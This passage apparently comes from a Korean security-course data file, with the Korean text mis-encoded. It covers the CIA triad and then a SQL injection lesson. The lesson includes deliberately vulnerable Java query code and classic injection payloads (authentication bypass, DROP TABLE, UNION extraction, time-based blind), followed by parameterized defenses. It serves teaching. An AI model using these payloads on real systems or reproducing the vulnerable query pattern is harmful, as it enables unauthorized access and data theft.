ì•„í‚¤í…ì²˜\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                     CIA í†µí•© ë³´ì•ˆ ì•„í‚¤í…ì²˜                        â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [í´ë¼ì´ì–¸íŠ¸]                                                   â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ HTTPS (ê¸°ë°€ì„±)                                          â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                               â”‚\nâ”‚   â”‚  WAF/CDN    â”‚ â†â”€â”€ DDoS ë°©ì–´ (ê°€ìš©ì„±)                        â”‚\nâ”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                               â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                               â”‚\nâ”‚   â”‚ Load Balancerâ”‚ â†â”€â”€ ì´ì¤‘í™” (ê°€ìš©ì„±)                          â”‚\nâ”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                               â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”‚\nâ”‚   â”‚           API Gateway               â”‚                       â”‚\nâ”‚   â”‚  â”œâ”€â”€ ì¸ì¦/ì¸ê°€ (ê¸°ë°€ì„±)              â”‚                       â”‚\nâ”‚   â”‚  â”œâ”€â”€ Rate Limiting (ê°€ìš©ì„±)          â”‚                       â”‚\nâ”‚   â”‚  â””â”€â”€ ìš”ì²­ ì„œëª… ê²€ì¦ (ë¬´ê²°ì„±)          â”‚                       â”‚\nâ”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”‚\nâ”‚   â”‚        Application Server           â”‚                       â”‚\nâ”‚   â”‚  â”œâ”€â”€ ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§                   â”‚                       â”‚\nâ”‚   â”‚  â”œâ”€â”€ ë°ì´í„° ì•”í˜¸í™” (ê¸°ë°€ì„±)          â”‚                       â”‚\nâ”‚   â”‚  â””â”€â”€ ê°ì‚¬ ë¡œê¹… (ë¬´ê²°ì„±)              â”‚                       â”‚\nâ”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”‚\nâ”‚   â”‚          Database Cluster           â”‚                       â”‚\nâ”‚   â”‚  â”œâ”€â”€ ì•”í˜¸í™” ì €ì¥ (ê¸°ë°€ì„±)            â”‚                       â”‚\nâ”‚   â”‚  â”œâ”€â”€ íŠ¸ëœì­ì…˜ (ë¬´ê²°ì„±)               â”‚                       â”‚\nâ”‚   â”‚  â””â”€â”€ ë³µì œ/ë°±ì—… (ê°€ìš©ì„±)              â”‚                       â”‚\nâ”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```"
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ & ë©´ì ‘",
                "content": "### ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸\n\n```\n[ ê¸°ë°€ì„± (Confidentiality) ]\nâ–¡ ë°ì´í„° ë¶„ë¥˜ ì²´ê³„ ìˆ˜ë¦½ (ê³µê°œ/ë‚´ë¶€/ê¸°ë°€/ê·¹ë¹„)\nâ–¡ ì ‘ê·¼ ì œì–´ ì •ì±… (RBAC/ABAC)\nâ–¡ ì „ì†¡ ì•”í˜¸í™” (TLS 1.3)\nâ–¡ ì €ì¥ ì•”í˜¸í™” (AES-256)\nâ–¡ í‚¤ ê´€ë¦¬ ì‹œìŠ¤í…œ (KMS)\nâ–¡ ë°ì´í„° ë§ˆìŠ¤í‚¹ (PII ë³´í˜¸)\n\n[ ë¬´ê²°ì„± (Integrity) ]\nâ–¡ ì…ë ¥ê°’ ê²€ì¦\nâ–¡ ë°ì´í„° í•´ì‹œ/ì„œëª…\nâ–¡ íŠ¸ëœì­ì…˜ ê´€ë¦¬\nâ–¡ ë³€ê²½ ì´ë ¥ ì¶”ì  (Audit Log)\nâ–¡ ë°±ì—… ë¬´ê²°ì„± ê²€ì¦\nâ–¡ ì½”ë“œ ì„œëª…\n\n[ ê°€ìš©ì„± (Availability) ]\nâ–¡ ì´ì¤‘í™”/í´ëŸ¬ìŠ¤í„°ë§\nâ–¡ ë¡œë“œë°¸ëŸ°ì‹±\nâ–¡ DDoS ë°©ì–´\nâ–¡ ì¥ì•  ë³µêµ¬ ê³„íš (DR)\nâ–¡ ë°±ì—…/ë³µì› í…ŒìŠ¤íŠ¸\nâ–¡ SLA ëª¨ë‹ˆí„°ë§\n```\n\n### ë©´ì ‘ ì˜ˆìƒ ì§ˆë¬¸\n\n```\nğŸ‘¶ ì£¼ë‹ˆì–´ ë ˆë²¨:\nQ: CIA Triadê°€ ë¬´ì—‡ì¸ê°€ìš”?\nA: ì •ë³´ë³´ì•ˆì˜ 3ëŒ€ í•µì‹¬ ì›ì¹™ì…ë‹ˆë‹¤.\n   - ê¸°ë°€ì„±: ì¸ê°€ëœ ì‚¬ëŒë§Œ ì ‘ê·¼\n   - ë¬´ê²°ì„±: ë°ì´í„° ë³€ì¡° ë°©ì§€\n   - ê°€ìš©ì„±: í•„ìš”í•  ë•Œ ì ‘ê·¼ ê°€ëŠ¥\n\nQ: ê¸°ë°€ì„±ì„ ë³´ì¥í•˜ëŠ” ë°©ë²•ì€?\nA: ì•”í˜¸í™”, ì ‘ê·¼ ì œì–´, ì¸ì¦/ì¸ê°€, ë„¤íŠ¸ì›Œí¬ ë¶„ë¦¬ ë“±\n\nğŸ‘¨â€ğŸ’¼ ì‹œë‹ˆì–´ ë ˆë²¨:\nQ: CIA ì¤‘ ì¶©ëŒì´ ë°œìƒí•˜ëŠ” ìƒí™©ê³¼ í•´ê²°ì±…ì€?\nA: ì˜ˆë¥¼ ë“¤ì–´ ê°•ë ¥í•œ ì•”í˜¸í™”(ê¸°ë°€ì„±)ëŠ” ì²˜ë¦¬ ì‹œê°„ ì¦ê°€ë¡œ\n   ê°€ìš©ì„±ì— ì˜í–¥. íŠ¸ë ˆì´ë“œì˜¤í”„ ë¶„ì„ í›„ ìœ„í—˜ ê¸°ë°˜ìœ¼ë¡œ\n   ì ì ˆí•œ ê· í˜•ì ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.\n\nQ: Zero Trustì™€ CIAì˜ ê´€ê³„ëŠ”?\nA: Zero TrustëŠ” \"Never Trust, Always Verify\" ì›ì¹™ìœ¼ë¡œ\n   CIA ì‚¼ì›ì¹™ì„ êµ¬í˜„í•˜ëŠ” í˜„ëŒ€ì  ë³´ì•ˆ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤.\n   íŠ¹íˆ ê¸°ë°€ì„±(ì§€ì†ì  ì¸ì¦)ê³¼ ë¬´ê²°ì„±(ëª¨ë“  ìš”ì²­ ê²€ì¦)ì„\n   ê°•í™”í•©ë‹ˆë‹¤.\n```\n\n### ë” ê³µë¶€í•  ìë£Œ\n\n```\nğŸ“š í‘œì¤€/í”„ë ˆì„ì›Œí¬:\n- NIST Cybersecurity Framework\n- ISO 27001/27002\n- CIS Controls\n\nğŸ”§ ì‹¤ìŠµ:\n- TryHackMe: CIA Triad ê´€ë ¨ ë£¸\n- HackTheBox: ë³´ì•ˆ ì›ì¹™ ì‹¤ìŠµ\n\nğŸ“Š ì°¸ê³ :\n- NIST SP 800-53: Security Controls\n- OWASP Security Guidelines\n```"
            }
        ]
    },

    # ===========================================
    # 02_ê³µê²© ì„¹ì…˜ - SQL Injection
    # ===========================================
    "02_ê³µê²©/sql-injection": {
        "title": "SQL ì¸ì ì…˜ ê³µê²© ì›ë¦¬",
        "description": "SQL ì¸ì ì…˜ ê³µê²©ì˜ ì›ë¦¬ì™€ ìœ í˜•ì„ í•™ìŠµí•©ë‹ˆë‹¤.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ¯ SQL ì¸ì ì…˜ ì™„ì „ ì •ë³µ",
                "content": "## í•œ ì¤„ ìš”ì•½\n> **SQL ì¿¼ë¦¬ì— ì•…ì„± ì½”ë“œë¥¼ ì£¼ì…í•˜ëŠ” ê³µê²©** - ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì¥ì•…í•˜ëŠ” ê°€ì¥ ì¹˜ëª…ì ì¸ ì›¹ ê³µê²©!\n\n---\n\n## ğŸ’¡ ë¹„ìœ ë¡œ ì´í•´í•˜ê¸°\n\n```\nğŸ« ë†€ì´ê³µì› ì…ì¥ì— ë¹„ìœ í•˜ë©´:\n\nì •ìƒ ìƒí™©:\nì§ì›: \"ì´ë¦„ì´ ë­ì˜ˆìš”?\"\nì†ë‹˜: \"í™ê¸¸ë™\"\nì§ì›: \"í™ê¸¸ë™ë‹˜, ì…ì¥í•˜ì„¸ìš”.\"\n\nSQL Injection:\nì§ì›: \"ì´ë¦„ì´ ë­ì˜ˆìš”?\"\ní•´ì»¤: \"í™ê¸¸ë™' OR '1'='1\"\nì§ì›: \"í™ê¸¸ë™... ë­”ê°€ ì´ìƒí•˜ì§€ë§Œ ì…ì¥í•˜ì„¸ìš”.\"\n       (ëª¨ë“  ì‚¬ëŒì´ ì…ì¥ ê°€ëŠ¥í•´ì§!)\n\në” ì‹¬í•œ ê²½ìš°:\ní•´ì»¤: \"í™ê¸¸ë™'; DROP TABLE visitors;--\"\nì§ì›: \"í™ê¸¸ë™...\" (ë°©ë¬¸ì ëª…ë‹¨ ì „ì²´ê°€ ì‚­ì œë¨!)\n```\n\n---\n\n## ğŸš¨ ì™œ ì•Œì•„ì•¼ í•˜ë‚˜? - ì‹¤ì œ í•´í‚¹ ì‚¬ê³ \n\n### ëŒ€í‘œì  ì‚¬ë¡€:\n```\nğŸ“Œ 2008ë…„ Heartland Payment Systems\nì›ì¸: SQL Injectionìœ¼ë¡œ ê²°ì œ ì‹œìŠ¤í…œ ì¹¨íˆ¬\ní”¼í•´: 1.3ì–µ ê°œ ì¹´ë“œ ì •ë³´ ìœ ì¶œ, $1.4ì–µ í”¼í•´\n\nğŸ“Œ 2011ë…„ Sony PlayStation Network\nì›ì¸: SQL Injection ì·¨ì•½ì  ì•…ìš©\ní”¼í•´: 7,700ë§Œ ê³„ì • ìœ ì¶œ, 23ì¼ê°„ ì„œë¹„ìŠ¤ ì¤‘ë‹¨\n\nğŸ“Œ 2015ë…„ TalkTalk (ì˜êµ­ í†µì‹ ì‚¬)\nì›ì¸: SQL Injection ê³µê²©\ní”¼í•´: 15ë§Œ ê³ ê° ì •ë³´ ìœ ì¶œ, $6ì²œë§Œ í”¼í•´\n```\n\n### í”¼í•´ ê·œëª¨:\n```\nğŸ”“ OWASP Top 10: A03 Injection (3ìœ„)\nğŸ“Š ì „ì²´ ì›¹ ê³µê²©ì˜ 65%ê°€ Injection ê´€ë ¨\nğŸ’° í‰ê·  í”¼í•´ì•¡: $4.45M/ê±´\nâ° íƒì§€ê¹Œì§€ í‰ê· : 287ì¼\n```"
            },
            {
                "type": "code",
                "title": "ğŸ’» ê³µê²© ì›ë¦¬ì™€ ì·¨ì•½í•œ ì½”ë“œ",
                "content": "### SQL Injection ê³µê²© íë¦„\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    SQL Injection ê³µê²© íë¦„                       â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [í•´ì»¤]                                                        â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 1. ì…ë ¥ê°’ ì¡°ì‘                                            â”‚\nâ”‚     â”‚    username: admin'--                                     â”‚\nâ”‚     â”‚    password: anything                                     â”‚\nâ”‚     â–¼                                                           â”‚\nâ”‚   [ì›¹ ì„œë²„]                                                      â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 2. ì¿¼ë¦¬ ìƒì„± (ì·¨ì•½í•œ ì½”ë“œ)                                 â”‚\nâ”‚     â”‚    \"SELECT * FROM users                                   â”‚\nâ”‚     â”‚     WHERE username='admin'--'                             â”‚\nâ”‚     â”‚     AND password='anything'\"                              â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚    â†’ ì£¼ì„(--)ìœ¼ë¡œ password ì²´í¬ ë¬´ë ¥í™”!                    â”‚\nâ”‚     â–¼                                                           â”‚\nâ”‚   [ë°ì´í„°ë² ì´ìŠ¤]                                                  â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 3. ì•…ì„± ì¿¼ë¦¬ ì‹¤í–‰                                         â”‚\nâ”‚     â”‚    â†’ admin ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ ì„±ê³µ!                           â”‚\nâ”‚     â–¼                                                           â”‚\nâ”‚   [í•´ì»¤: ê´€ë¦¬ì ê¶Œí•œ íšë“]                                        â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œ (Java Spring Boot)\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âŒ ì·¨ì•½í•œ ì½”ë“œ #1: ë¬¸ìì—´ ì—°ê²° ë°©ì‹\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Repository\npublic class VulnerableUserRepository {\n    \n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n    \n    // ğŸš¨ ìœ„í—˜! ì‚¬ìš©ì ì…ë ¥ì„ ì§ì ‘ ì¿¼ë¦¬ì— ì‚½ì…\n    public User findByUsername(String username) {\n        String sql = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\n        // í•´ì»¤ ì…ë ¥: admin'--\n        // ì‹¤í–‰ë˜ëŠ” ì¿¼ë¦¬: SELECT * FROM users WHERE username = 'admin'--'\n        // ê²°ê³¼: admin ê³„ì • ì •ë³´ ë°˜í™˜ (ë¹„ë°€ë²ˆí˜¸ ì²´í¬ ì—†ì´!)\n        return jdbcTemplate.queryForObject(sql, new UserRowMapper());\n    }\n    \n    // ğŸš¨ ìœ„í—˜! ë¡œê·¸ì¸ ì¿¼ë¦¬\n    public User login(String username, String password) {\n        String sql = \"SELECT * FROM users WHERE username = '\" + username + \n                     \"' AND password = '\" + password + \"'\";\n        // í•´ì»¤ ì…ë ¥: username=admin'-- password=ì•„ë¬´ê±°ë‚˜\n        // ì‹¤í–‰ë˜ëŠ” ì¿¼ë¦¬: SELECT * FROM users WHERE username = 'admin'--' AND password = 'ì•„ë¬´ê±°ë‚˜'\n        // --ëŠ” SQL ì£¼ì„ì´ë¯€ë¡œ AND ì´í›„ëŠ” ë¬´ì‹œë¨!\n        return jdbcTemplate.queryForObject(sql, new UserRowMapper());\n    }\n}\n```\n\n### SQL Injection ê³µê²© ìœ í˜•\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ê³µê²© ìœ í˜• 1: Authentication Bypass (ì¸ì¦ ìš°íšŒ)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ì…ë ¥ê°’: username = admin'--\n// ê²°ê³¼ ì¿¼ë¦¬: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'\n// íš¨ê³¼: ë¹„ë°€ë²ˆí˜¸ ì²´í¬ ë¬´ë ¥í™”\n\n// ì…ë ¥ê°’: username = ' OR '1'='1\n// ê²°ê³¼ ì¿¼ë¦¬: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'\n// íš¨ê³¼: í•­ìƒ ì°¸ì´ë¯€ë¡œ ì²« ë²ˆì§¸ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ê³µê²© ìœ í˜• 2: UNION Based (ë°ì´í„° ì¶”ì¶œ)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ì…ë ¥ê°’: 1 UNION SELECT username, password, null, null FROM users--\n// ê²°ê³¼: ëª¨ë“  ì‚¬ìš©ìì˜ ê³„ì • ì •ë³´ ì¶”ì¶œ\n\n@GetMapping(\"/products\")\npublic List<Product> getProducts(@RequestParam String category) {\n    // ğŸš¨ ì·¨ì•½í•œ ì½”ë“œ\n    String sql = \"SELECT id, name, price, description FROM products \" +\n                 \"WHERE category = '\" + category + \"'\";\n    // í•´ì»¤ ì…ë ¥: ' UNION SELECT id, username, password, email FROM users--\n    // ê²°ê³¼: ìƒí’ˆ ëŒ€ì‹  ì‚¬ìš©ì ì •ë³´ê°€ ë…¸ì¶œë¨!\n    return jdbcTemplate.query(sql, productMapper);\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ê³µê²© ìœ í˜• 3: Blind SQL Injection (ì •ë³´ ì¶”ë¡ )\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ì…ë ¥ê°’: admin' AND SUBSTRING(password,1,1)='a'--\n// ê²°ê³¼: ì‘ë‹µ ì‹œê°„/ê²°ê³¼ ì°¨ì´ë¡œ ë¹„ë°€ë²ˆí˜¸ í•œ ê¸€ìì”© ì¶”ë¡ \n\n// Time-based Blind:\n// ì…ë ¥ê°’: admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--\n// ê²°ê³¼: 5ì´ˆ ì§€ì—°ë˜ë©´ ì²« ê¸€ìê°€ 'a'ì„ì„ í™•ì¸\n```"
            },
            {
                "type": "code",
                "title": "ğŸ›¡ï¸ ë°©ì–´ ì½”ë“œì™€ ì‹¤ì „",
                "content": "### ì•ˆì „í•œ ì½”ë“œ (Java Spring Boot 3.x)\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âœ… ë°©ì–´ ë°©ë²• 1: PreparedStatement (íŒŒë¼ë¯¸í„° ë°”ì¸ë”©)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Repository\npublic class SecureUserRepository {\n    \n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n    \n    // âœ… ì•ˆì „! íŒŒë¼ë¯¸í„° ë°”ì¸ë”© ì‚¬ìš©\n    public User findByUsername(String username) {\n        String sql = \"SELECT * FROM users WHERE username = ?\";\n        // ?ì— ë°”ì¸ë”©ë˜ëŠ” ê°’ì€ í•­ìƒ \"ë¬¸ìì—´ ë°ì´í„°\"ë¡œ ì²˜ë¦¬\n        // SQL ëª…ë ¹ì–´ë¡œ í•´ì„ë˜ì§€ ì•ŠìŒ!\n        return jdbcTemplate.queryForObject(sql, new UserRowMapper(), username);\n    }\n    \n    // âœ… ì•ˆì „! Named Parameter ì‚¬ìš©\n    public User login(String username, String password) {\n        String sql = \"SELECT * FROM users WHERE username = :username \" +\n                     \"AND password = :password\";\n        MapSqlParameterSource params = new MapSqlParameterSource()\n            .addValue(\"username\", username)\n            .addValue(\"password\", password);\n        return namedParameterJdbcTemplate.queryForObject(sql, params, new UserRowMapper());\n    }\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âœ… ë°©ì–´ ë°©ë²• 2: JPA/Hibernate ì‚¬ìš© (ìë™ íŒŒë¼ë¯¸í„° ë°”ì¸ë”©)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Repository\npublic interface UserRepository extends JpaRepository<User, Long> {\n    \n    // âœ… ë©”ì„œë“œ ì´ë¦„ ê¸°ë°˜ ì¿¼ë¦¬ - ìë™ìœ¼ë¡œ ì•ˆì „\n    Optional<User> findByUsername(String username);\n    \n    // âœ… JPQL - íŒŒë¼ë¯¸í„° ë°”ì¸ë”©ìœ¼ë¡œ ì•ˆì „\n    @Query(\"SELECT u FROM User u WHERE u.username = :username AND u.status = :status\")\n    List<User> findActiveUsers(@Param(\"username\") String username, \n                               @Param(\"status\") String status);\n    \n    // âœ… Native Queryë„ íŒŒë¼ë¯¸í„° ë°”ì¸ë”© ì‚¬ìš©\n    @Query(value = \"SELECT * FROM users WHERE email LIKE %:domain\", nativeQuery = true)\n    List<User> findByEmailDomain(@Param(\"domain\") String domain);\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âœ… ë°©ì–´ ë°©ë²• 3: ì…ë ¥ê°’ ê²€ì¦ + í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Service\npublic class SecureProductService {\n    \n    // í—ˆìš©ëœ ì •ë ¬ ì»¬ëŸ¼ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸\n    private static final Set<String> ALLOWED_SORT_COLUMNS = \n        Set.of(\"id\", \"name\", \"price\", \"created_at\");\n    \n    private static final Set<String> ALLOWED_SORT_DIRECTIONS = \n        Set.of(\"ASC\", \"DESC\");\n    \n    public List<Product> getProducts(String sortBy, String direction) {\n        // âœ… í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦\n        if (!ALLOWED_SORT_COLUMNS.contains(sortBy)) {\n            throw new IllegalArgumentException(\"Invalid sort column: \" + sortBy);\n        }\n        if (!ALLOWED_SORT_DIRECTIONS.contains(direction.toUpperCase())) {\n            throw new IllegalArgumentException(\"Invalid sort direction\");\n        }\n        \n        // ê²€ì¦ëœ ê°’ë§Œ ì¿¼ë¦¬ì— ì‚¬ìš©\n        String sql = \"SELECT * FROM products ORDER BY \" + sortBy + \" \" + direction;\n        return jdbcTemplate.query(sql, productMapper);\n    }\n}\n```\n\n### ë°©ì–´ ì›ë¦¬ ì„¤ëª…\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    PreparedStatement ë™ì‘ ì›ë¦¬                   â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [ë¬¸ìì—´ ì—°ê²° ë°©ì‹] - ìœ„í—˜!                                      â”‚\nâ”‚   \"SELECT * FROM users WHERE name = '\" + input + \"'\"            â”‚\nâ”‚                                                                 â”‚\nâ”‚   input = \"admin'--\"                                            â”‚\nâ”‚   ê²°ê³¼: SELECT * FROM users WHERE name = 'admin'--'             â”‚\nâ”‚         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                 â”‚\nâ”‚         SQL íŒŒì„œê°€ ì „ì²´ë¥¼ SQLë¡œ í•´ì„ â†’ ê³µê²© ì„±ê³µ                   â”‚\nâ”‚                                                                 